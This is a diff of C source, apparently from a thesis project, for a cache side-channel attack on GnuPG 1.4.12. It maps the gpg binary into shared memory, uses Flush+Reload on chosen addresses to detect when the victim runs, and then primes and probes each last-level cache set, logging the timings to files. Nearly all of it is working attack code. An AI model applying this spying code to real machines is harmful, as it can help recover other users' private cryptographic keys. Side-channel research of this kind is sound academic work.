@@ -1,11 +1,3 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/mman.h>
-#include <fcntl.h> //open
-#include <sched.h>
-#include <linux/perf_event.h>
-#include <linux/hw_breakpoint.h>
-#include <asm/unistd.h>
 #include "../../Utils/src/cachetechniques.h"
 #include "../../Utils/src/performancecounters.h"
 #include "../../Utils/src/fileutils.h"
@@ -22,6 +14,7 @@
 #define PROBE_ANALYSIS_DATA_FILENAME "/home/root/thesis-code/probe_static_analysis.data"
 #define MAX_TIMES_TO_CSV 15000
 #define MAX_TIMES_TO_OBTAIN_THRESHOLD 1024*1024
+#define OUTPUTRAWDATA 1
 
 typedef struct congruentaddrs {
 	int wasaccessed;
@@ -33,7 +26,7 @@ typedef struct llcache {
 	void *llcachebasepointer;
 	int mappedsize;
 	int pagemap;
-	unsigned short int llc_analysis[MAX_TIMES_TO_CSV*LL_CACHE_NUMBER_OF_SETS];
+	unsigned short int llc_analysis[MAX_TIMES_TO_CSV * LL_CACHE_NUMBER_OF_SETS];
 } llcache_t;
 
 typedef struct evictionconfig {
@@ -355,12 +348,11 @@ void obtainevictiondata(int mappedsize, int evictionsetsize, int sameeviction,
 	evictiondata->hitsrate = (countcorrecthits / allhits) * 100;
 }
 
-
 void analysellc(int set, llcache_t *llcache, evictionconfig_t *config,
 		int maxruns) {
 	int i;
 
-	for (i = 0; i < maxruns; i += 1) {
+	for (i = set - 1; i < maxruns; i += LL_CACHE_NUMBER_OF_SETS) {
 
 		//Prime
 		primellcache(config, llcache, set);
@@ -371,24 +363,33 @@ void analysellc(int set, llcache_t *llcache, evictionconfig_t *config,
 }
 
 #include <sys/stat.h>
-#define EXE_FILENAME "/home/root/gnupg-1.4.12/bin/gpg"
-#define EXE_ADDRS_FILENAME "/home/root/thesis-code/exe_addresses.txt"
 #define THRESHOLD 45
 #define GPG_MAX_SIZE_BYTES 4194304
 #define OUTPUTRAWDATA 1
 #define DELAYFORVICTIMACTIVITY 2800
+#define NUMBER_OF_EXE_ADDRS 3
 
-void waitforvictimactivity(){
-
-	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
+typedef struct waitforvictim {
 	int nr_addrs;
+	char* mapping_addr;
+	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][NUMBER_OF_EXE_ADDRS];
+	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
+} waitforvictim_t;
+
+void preparewaitforactivity(waitforvictim_t **waitforvictim) {
+//	*llcache = calloc(1, sizeof(llcache_t));
+//		(*llcache)->mappedsize = mappedsize;
+	*waitforvictim = calloc(1, sizeof(waitforvictim_t));
+
 	int fd_exe;
 	struct stat sbuff;
-	char* mapping_addr;
 
 	//obtain the addrs to monitor
-	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);
-	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];
+	(*waitforvictim)->nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME,
+			(*waitforvictim)->exe_addrs);
+	if ((*waitforvictim)->nr_addrs != NUMBER_OF_EXE_ADDRS) {
+		handle_error("NUMBER OF EXE ADDRS ERROR");
+	}
 
 	//share the executable
 	fd_exe = open(EXE_FILENAME, O_RDONLY);
@@ -396,25 +397,31 @@ void waitforvictimactivity(){
 		handle_error("open_exe_filename");
 	if (fstat(fd_exe, &sbuff) == -1)
 		handle_error("fstat");
-	mapping_addr = (char*) mmap(0, GPG_MAX_SIZE_BYTES, PROT_READ, MAP_PRIVATE,
-			fd_exe, 0);
-	if (mapping_addr == MAP_FAILED)
+	(*waitforvictim)->mapping_addr = (char*) mmap(0, GPG_MAX_SIZE_BYTES,
+	PROT_READ, MAP_PRIVATE, fd_exe, 0);
+	if ((*waitforvictim)->mapping_addr == MAP_FAILED)
 		handle_error("mmap");
 	printf(".exe shared\n");
+}
 
-	unsigned long ptr_offset = (unsigned long) mapping_addr;
+void waitforvictimactivity(waitforvictim_t *waitforvictim) {
+
+	unsigned long ptr_offset = (unsigned long) waitforvictim->mapping_addr;
 
 	unsigned long long start = getcurrenttsc();
-	analysealladdrs(analysis_array[0], ptr_offset, exe_addrs, nr_addrs,
-	THRESHOLD);
+	fr_analysealladdrs(OUTPUTRAWDATA, waitforvictim->analysis_array[0],
+			ptr_offset, waitforvictim->exe_addrs, NUMBER_OF_EXE_ADDRS,
+			THRESHOLD);
 	do {
 		do {
 			start += DELAYFORVICTIMACTIVITY;
 		} while (missedvictimactivity(start));
-		analysealladdrs(analysis_array[0], ptr_offset, exe_addrs, nr_addrs,
-		THRESHOLD);
-	} while (!isvictimactive(analysis_array[0], nr_addrs,
-	OUTPUTRAWDATA ? THRESHOLD : 2));
+		fr_analysealladdrs(OUTPUTRAWDATA, waitforvictim->analysis_array[0],
+				ptr_offset, waitforvictim->exe_addrs, waitforvictim->nr_addrs,
+				THRESHOLD);
+	} while (!isvictimactive(waitforvictim->analysis_array[0],
+			waitforvictim->nr_addrs,
+			OUTPUTRAWDATA ? THRESHOLD : 2));
 }
 
 int main() {
@@ -449,21 +456,26 @@ int main() {
 
 	llcache_t *llcache;
 	evictionconfig_t *config;
+	waitforvictim_t *waitforvictim;
+	int setidx;
 
 	preparellcache(&llcache, mappedsize);
 	prepareevictconfig(&config, evictionsetsize, sameeviction,
 			congruentvirtualaddrs);
+	preparewaitforactivity(&waitforvictim);
+	for (setidx = 1; setidx <= LL_CACHE_NUMBER_OF_SETS; ++setidx) {
+		printf("\nWaiting for activity...\n");
 
-	printf("\nWaiting for activity...\n");
-	waitforvictimactivity();
+		waitforvictimactivity(waitforvictim);
 
-	int set = 1;
-	printf("Analyse set number: %d\n",set);
-	analysellc(set, llcache, config, MAX_TIMES_TO_CSV);
+		//int setidx = 1;
+		printf("Analyse set number: %d\n", setidx);
+		analysellc(setidx, llcache, config, MAX_TIMES_TO_CSV);
+	}
 
-	arraytodatafile(PRIME_ANALYSIS_DATA_FILENAME, PROBE_ANALYSIS_DATA_FILENAME,
-			llcache->llc_analysis, MAX_TIMES_TO_CSV / 2,
-			LL_CACHE_NUMBER_OF_SETS);
+	arraytodatafilewithoutlabels(PROBE_ANALYSIS_DATA_FILENAME,
+			llcache->llc_analysis,
+			MAX_TIMES_TO_CSV, LL_CACHE_NUMBER_OF_SETS);
 
 	return 0;
 }
